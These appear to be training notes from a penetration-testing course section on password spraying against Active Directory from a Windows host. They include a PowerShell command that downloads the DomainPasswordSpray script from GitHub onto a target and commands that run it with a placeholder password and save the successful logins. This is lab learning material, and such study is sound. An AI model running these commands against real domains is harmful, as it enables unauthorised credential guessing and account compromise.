# Section 12: Internal Password Spraying - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1422
- Code/command blocks: 2

> Terminal output is omitted; only commands & scripts are captured.

> **Setup:** get [dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) onto the box first. It runs in your current domain context (auto-builds the user list from the domain) and reads the lockout policy to skip at-risk accounts by default — don't use `-Force`.

```powershell
# pull just the script onto the target
iwr https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1 -OutFile DomainPasswordSpray.ps1
```

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password {{PASSWORD}} -OutFile spray_success -ErrorAction SilentlyContinue
```

